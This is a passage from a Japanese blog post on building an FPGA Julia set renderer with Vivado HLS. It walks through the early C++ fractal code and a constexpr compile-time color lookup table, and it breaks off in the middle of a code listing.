<p>HLS は RTL より抽象度の高い言語によってハードウェアの設計を可能にする技術です。HLS にも様々な種類があるので一概にはいえませんが、この抽象度の高い言語とは C や Java のようなソフトウェア開発のためのプログラミング言語を指します。プログラミング言語で記述したアルゴリズムがどのようにハードウェア化されるかは<a href="https://www.xilinx.com/support/documentation/sw_manuals/xilinx2018_3/ug902-vivado-high-level-synthesis.pdf#page=6">このへん</a>が参考になると思います。ソフトウェア向けのプログラミング言語を用いた記述を入力とする HLS はソフトウェアで実装されたアルゴリズムのハードウェア化をある程度容易にしたことから、特にハードウェアアクセラレータ実装をしている界隈などで注目されているなかなかホットな技術といってよいでしょう。</p>
<p>今回 Julia set を描画する回路を設計するにあたり、Xilinx 社が提供している HLS の開発環境である <a href="https://www.xilinx.com/products/design-tools/vivado/integration/esl-design.html">Vivado HLS</a> を利用することにしました。理由としては、とりあえず動作するものを短期間で実装したかったのと、個人的に別の HLS 開発環境に触れていた経験があることから Xilinx の HLS についても調査したいという思いがあったためです。</p>
<h3 id="vivado-hls-で-julia-set-描画回路を実装する">Vivado HLS で Julia set 描画回路を実装する</h3>
<p>Vivado HLS は入力言語に C、C++、SystemC をサポートしています。今回は C++ で実装しました。最終的なソースコードは<a href="https://github.com/Tosainu/ultra96-fractal/tree/1ed4e5e409d6445a85741149c112322cc6fc251c/hls_ip/fractal">これ</a>です。</p>
<p>Vivado HLS は思っていた以上に強かったようで、とりあえず適当に実装してみた Julia set のコードも普通に合成できてしまい驚きました。このため「アルゴリズムを FPGA に持っていく」点に関してはほとんど苦労することなく行うことができたと言って良いです。Vivado HLS すごい。ちなみにコミットログをたどったところ、開発初期のコードは<a href="https://github.com/Tosainu/ultra96-fractal/blob/9aeb006057254d9e9d859b307b64db8e86adc5ef/hls_ip/fractal/fractal.cc">こんな感じ</a>だったようです。</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb2-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;cmath&gt;</span></span>
<span id="cb2-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;complex&gt;</span></span>
<span id="cb2-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&quot;fractal.h&quot;</span></span>
<span id="cb2-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="dt">uint24_type</span> colorize<span class="op">(</span><span class="dt">fix64_type</span> t<span class="op">)</span> <span class="op">{</span></span>
<span id="cb2-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-7" aria-hidden="true" tabindex="-1"></a>  <span class="co">// https://solarianprogrammer.com/2013/02/28/mandelbrot-set-cpp-11/</span></span>
<span id="cb2-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="dt">fix64_type</span> one<span class="op">{</span><span class="fl">1.0</span><span class="op">};</span></span>
<span id="cb2-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="dt">fix64_type</span> r <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">8.5</span><span class="op">}</span> <span class="op">*</span> <span class="op">(</span>one <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> <span class="op">(</span>one <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> <span class="op">(</span>one <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> t<span class="op">;</span></span>
<span id="cb2-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="dt">fix64_type</span> g <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">15.0</span><span class="op">}</span> <span class="op">*</span> <span class="op">(</span>one <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> <span class="op">(</span>one <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> t <span class="op">*</span> t<span class="op">;</span></span>
<span id="cb2-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="dt">fix64_type</span> b <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">9.0</span><span class="op">}</span> <span class="op">*</span> <span class="op">(</span>one <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> t <span class="op">*</span> t <span class="op">*</span> t<span class="op">;</span></span>
<span id="cb2-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-13" aria-hidden="true" tabindex="-1"></a>  <span class="dt">uint24_type</span> rgb <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb2-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-14" aria-hidden="true" tabindex="-1"></a>  rgb <span class="op">|=</span> <span class="kw">static_cast</span><span class="op">&lt;</span><span class="dt">uint24_type</span><span class="op">&gt;(</span><span class="bu">std::</span>min<span class="op">(</span>r<span class="op">,</span> one<span class="op">)</span> <span class="op">*</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">255.0</span><span class="op">});</span></span>
<span id="cb2-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-15" aria-hidden="true" tabindex="-1"></a>  rgb <span class="op">|=</span> <span class="kw">static_cast</span><span class="op">&lt;</span><span class="dt">uint24_type</span><span class="op">&gt;(</span><span class="bu">std::</span>min<span class="op">(</span>g<span class="op">,</span> one<span class="op">)</span> <span class="op">*</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">255.0</span><span class="op">})</span> <span class="op">&lt;&lt;</span> <span class="dv">8</span><span class="op">;</span></span>
<span id="cb2-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-16" aria-hidden="true" tabindex="-1"></a>  rgb <span class="op">|=</span> <span class="kw">static_cast</span><span class="op">&lt;</span><span class="dt">uint24_type</span><span class="op">&gt;(</span><span class="bu">std::</span>min<span class="op">(</span>b<span class="op">,</span> one<span class="op">)</span> <span class="op">*</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">255.0</span><span class="op">})</span> <span class="op">&lt;&lt;</span> <span class="dv">16</span><span class="op">;</span></span>
<span id="cb2-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> rgb<span class="op">;</span></span>
<span id="cb2-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb2-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> fractal<span class="op">(</span><span class="dt">stream_type</span><span class="op">&amp;</span> <span class="va">m_axis</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb2-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="pp">#pragma HLS INTERFACE axis register both port=m_axis</span></span>
<span id="cb2-22"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="pp">#pragma HLS INTERFACE s_axilite port=return</span></span>
<span id="cb2-23"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-24"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-24" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> x1 <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">1.0</span><span class="op">};</span></span>
<span id="cb2-25"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-25" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> y1 <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span>MAX_HEIGHT<span class="op">}</span> <span class="op">/</span> <span class="dt">fix64_type</span><span class="op">{</span>MAX_WIDTH<span class="op">};</span></span>
<span id="cb2-26"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-26" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> dx <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">2.0</span><span class="op">}</span> <span class="op">*</span> x1 <span class="op">/</span> <span class="dt">fix64_type</span><span class="op">{</span>MAX_WIDTH<span class="op">};</span></span>
<span id="cb2-27"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-27" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> dy <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">2.0</span><span class="op">}</span> <span class="op">*</span> y1 <span class="op">/</span> <span class="dt">fix64_type</span><span class="op">{</span>MAX_HEIGHT<span class="op">};</span></span>
<span id="cb2-28"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-29"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-29" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> offset_x <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="dv">0</span><span class="op">};</span></span>
<span id="cb2-30"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-30" aria-hidden="true" tabindex="-1"></a>  <span class="at">const</span> <span class="kw">auto</span> offset_y <span class="op">=</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="dv">0</span><span class="op">};</span></span>
<span id="cb2-31"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-32"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-32" aria-hidden="true" tabindex="-1"></a>  <span class="dt">video_type</span> video<span class="op">;</span></span>
<span id="cb2-33"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-33" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-34"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-34" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> <span class="op">(</span><span class="bu">std::</span>uint32_t<span class="op"> </span>y <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> y <span class="op">&lt;</span> MAX_HEIGHT<span class="op">;</span> y<span class="op">++)</span> <span class="op">{</span></span>
<span id="cb2-35"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-35" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="bu">std::</span>uint32_t<span class="op"> </span>x <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> x <span class="op">&lt;</span> MAX_WIDTH<span class="op">;</span> x<span class="op">++)</span> <span class="op">{</span></span>
<span id="cb2-36"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-36" aria-hidden="true" tabindex="-1"></a>      <span class="co">// Set Start-of-Frame (tuser) and End-of-Line (tlast) singale</span></span>
<span id="cb2-37"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-37" aria-hidden="true" tabindex="-1"></a>      <span class="co">// https://forums.xilinx.com/t5/Video/Video-Beginner-Series-14-Creating-a-Pattern-Generator-using-HLS/m-p/895489/highlight/true#M21986</span></span>
<span id="cb2-38"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-38" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>x <span class="op">==</span> <span class="dv">0</span> <span class="op">&amp;&amp;</span> y <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb2-39"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-39" aria-hidden="true" tabindex="-1"></a>        video<span class="op">.</span>user <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb2-40"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-40" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb2-41"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-41" aria-hidden="true" tabindex="-1"></a>        video<span class="op">.</span>user <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb2-42"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-42" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb2-43"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-43" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="op">(</span>x <span class="op">==</span> MAX_WIDTH <span class="op">-</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb2-44"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-44" aria-hidden="true" tabindex="-1"></a>        video<span class="op">.</span>last <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb2-45"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-45" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
<span id="cb2-46"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-46" aria-hidden="true" tabindex="-1"></a>        video<span class="op">.</span>last <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb2-47"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-47" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb2-48"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-48" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-49"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-49" aria-hidden="true" tabindex="-1"></a>      <span class="at">const</span> <span class="kw">auto</span> cx <span class="op">=</span> <span class="op">-</span>x1 <span class="op">+</span> dx <span class="op">*</span> x <span class="op">+</span> offset_x<span class="op">;</span></span>
<span id="cb2-50"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-50" aria-hidden="true" tabindex="-1"></a>      <span class="at">const</span> <span class="kw">auto</span> cy <span class="op">=</span> <span class="op">-</span>y1 <span class="op">+</span> dy <span class="op">*</span> y <span class="op">+</span> offset_y<span class="op">;</span></span>
<span id="cb2-51"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-51" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-52"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-52" aria-hidden="true" tabindex="-1"></a>      <span class="kw">auto</span> z       <span class="op">=</span> <span class="bu">std::</span>complex<span class="op">&lt;</span><span class="dt">fix64_type</span><span class="op">&gt;{</span>cx<span class="op">,</span> cy<span class="op">};</span></span>
<span id="cb2-53"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-53" aria-hidden="true" tabindex="-1"></a>      <span class="at">const</span> <span class="kw">auto</span> c <span class="op">=</span> <span class="bu">std::</span>complex<span class="op">&lt;</span><span class="dt">fix64_type</span><span class="op">&gt;{-</span><span class="fl">0.4</span><span class="op">,</span> <span class="fl">0.6</span><span class="op">};</span></span>
<span id="cb2-54"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-54" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-55"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-55" aria-hidden="true" tabindex="-1"></a>      <span class="bu">std::</span>uint32_t<span class="op"> </span>i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb2-56"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-56" aria-hidden="true" tabindex="-1"></a>      <span class="cf">while</span> <span class="op">(</span>i <span class="op">&lt;</span> MAX_ITERATIONS <span class="op">&amp;&amp;</span> z<span class="op">.</span>real<span class="op">()</span> <span class="op">*</span> z<span class="op">.</span>real<span class="op">()</span> <span class="op">+</span> z<span class="op">.</span>imag<span class="op">()</span> <span class="op">*</span> z<span class="op">.</span>imag<span class="op">()</span> <span class="op">&lt;=</span> <span class="fl">4.0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb2-57"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-57" aria-hidden="true" tabindex="-1"></a>        z <span class="op">=</span> z <span class="op">*</span> z <span class="op">+</span> c<span class="op">;</span></span>
<span id="cb2-58"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-58" aria-hidden="true" tabindex="-1"></a>        i<span class="op">++;</span></span>
<span id="cb2-59"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-59" aria-hidden="true" tabindex="-1"></a>      <span class="op">}</span></span>
<span id="cb2-60"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-60" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-61"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-61" aria-hidden="true" tabindex="-1"></a>      video<span class="op">.</span>data <span class="op">=</span> colorize<span class="op">(</span><span class="kw">static_cast</span><span class="op">&lt;</span><span class="dt">fix64_type</span><span class="op">&gt;(</span>i<span class="op">)</span> <span class="op">/</span> <span class="dt">fix64_type</span><span class="op">{</span><span class="fl">255.0</span><span class="op">});</span></span>
<span id="cb2-62"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-62" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-63"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-63" aria-hidden="true" tabindex="-1"></a>      <span class="va">m_axis</span> <span class="op">&lt;&lt;</span> video<span class="op">;</span></span>
<span id="cb2-64"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-64" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb2-65"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-65" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb2-66"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb2-66" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>もちろんこのままでは実用にならないほど性能が出ないためチューニングをする必要があります。今回はパイプライン化や並列化、固定小数点数の採用やループの反復回数の固定化など様々なチューニングを行いました。そのなかでも少し変わった例として、色つけ処理部分 (前述した Rust や C++ コード中の <code>colorize</code> 関数) に適用した手法を紹介しようと思います。</p>
<p>色つけ処理は反復回数 [0, 255] に RGB の色を割り当てるものです。RGB の各チャンネルの値は、反復回数 <span class="math inline">i</span> を最大反復回数 255 で割った [0, 1.0] の値 <span class="math inline">t</span> を次の3つの関数に渡すことで求めています。
<span class="math display">
\begin{aligned}
    r(t) &amp;= 9 (1 - t) t^3 \\
    g(t) &amp;= 15 (1 - t)^2 t^2 \\
    b(t) &amp;= 8.5 (1 - t)^3 t
\end{aligned}
</span>
<img src="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/color.svg" /></p>
<p>この関数は見ての通り乗算が多く、そのまま FPGA に落とせば計算に必要なクロックサイクル数は増えるし貴重な FPGA のリソースを大量に消費するしでなにもいいことがありません。今回これらの関数に与えられうる値は <span class="math inline">\cfrac{0}{255}, \cfrac{1}{255}, \cfrac{2}{255}, \dots, \cfrac{255}{255}</span> と決まっているので定数化が可能ですが、流石に手作業で 256 個の値を計算しハードコーディングするのは面倒だしメンテナンス性も下がって最悪です。</p>
<p>そこで、Vivado HLS で C++11 の機能がある程度利用可能<a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>なことを活用 (悪用？) し、<strong><code>constexpr</code> を使った色変換テーブルのコンパイル時計算</strong>をやってみました。</p>
<p>まず <code>colorize</code> 関数を <code>constexpr</code> 化します。C++11 なので <code>constexpr</code> な関数の中身が <code>return</code> 文1つしか書けない点や <code>constexpr</code> な <a href="https://en.cppreference.com/w/cpp/algorithm/min"><code>std::min</code></a> などがないことに注意します。</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb3-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="kw">namespace</span> detail <span class="op">{</span></span>
<span id="cb3-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-3"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="kw">template</span> <span class="op">&lt;</span><span class="kw">class</span> T<span class="op">&gt;</span></span>
<span id="cb3-4"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> T constexpr_min<span class="op">(</span>T a<span class="op">,</span> T b<span class="op">)</span> <span class="op">{</span></span>
<span id="cb3-5"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> a <span class="op">&lt;</span> b <span class="op">?</span> a <span class="op">:</span> b<span class="op">;</span></span>
<span id="cb3-6"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb3-7"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-8"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>f2i<span class="op">(</span><span class="dt">double</span> d<span class="op">)</span> <span class="op">{</span></span>
<span id="cb3-9"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-9" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="kw">static_cast</span><span class="op">&lt;</span><span class="bu">std::</span>uint32_t<span class="op">&gt;(</span>constexpr_min<span class="op">(</span>d<span class="op">,</span> <span class="fl">1.0</span><span class="op">)</span> <span class="op">*</span> <span class="fl">255.0</span><span class="op">);</span></span>
<span id="cb3-10"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb3-11"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-12"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>colorize<span class="op">(</span><span class="dt">double</span> t<span class="op">)</span> <span class="op">{</span></span>
<span id="cb3-13"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="op">(</span>f2i<span class="op">(</span><span class="fl">9.0</span> <span class="op">*</span> <span class="op">(</span><span class="fl">1.0</span> <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> t <span class="op">*</span> t <span class="op">*</span> t<span class="op">)</span> <span class="op">&lt;&lt;</span> <span class="dv">16</span><span class="op">)</span> <span class="op">|</span>                <span class="co">// red</span></span>
<span id="cb3-14"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-14" aria-hidden="true" tabindex="-1"></a>         <span class="op">(</span>f2i<span class="op">(</span><span class="fl">8.5</span> <span class="op">*</span> <span class="op">(</span><span class="fl">1.0</span> <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> <span class="op">(</span><span class="fl">1.0</span> <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> <span class="op">(</span><span class="fl">1.0</span> <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> t<span class="op">)</span> <span class="op">&lt;&lt;</span> <span class="dv">8</span><span class="op">)</span> <span class="op">|</span> <span class="co">// blue</span></span>
<span id="cb3-15"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-15" aria-hidden="true" tabindex="-1"></a>         <span class="op">(</span>f2i<span class="op">(</span><span class="fl">15.0</span> <span class="op">*</span> <span class="op">(</span><span class="fl">1.0</span> <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> <span class="op">(</span><span class="fl">1.0</span> <span class="op">-</span> t<span class="op">)</span> <span class="op">*</span> t <span class="op">*</span> t<span class="op">));</span>              <span class="co">// green</span></span>
<span id="cb3-16"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb3-17"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-18"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-18" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>index2color<span class="op">(</span><span class="bu">std::</span>size_t<span class="op"> </span>i<span class="op">)</span> <span class="op">{</span></span>
<span id="cb3-19"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> colorize<span class="op">(</span><span class="kw">static_cast</span><span class="op">&lt;</span><span class="dt">double</span><span class="op">&gt;(</span>i<span class="op">)</span> <span class="op">/</span> <span class="fl">255.0</span><span class="op">);</span></span>
<span id="cb3-20"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb3-21"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-22"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb3-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="co">// namespace detail</span></span></code></pre></div>
<p>続いて反復回数から RGB 値を求める色変換テーブルを構築する部分を書いていきます。こんな感じのコードで各要素が <code>index2color(index)</code> となる配列 <code>color_table</code> をコンパイル時に構築できるようにするのが目標です。</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb4-1"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="kw">constexpr</span> <span class="bu">std::</span>array<span class="op">&lt;</span><span class="bu">std::</span>uint32_t<span class="op">,</span> <span class="dv">256</span><span class="op">&gt;</span> make_color_table<span class="op">()</span> <span class="op">{</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2019/05/15/ultra96-julia-set-explorer/#cb4-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> detail::make_array<span class="op">&lt;</span><span class="dv">256</span><span class="op">&gt;(</span>detail::index2color<span class="op">);</span></span>
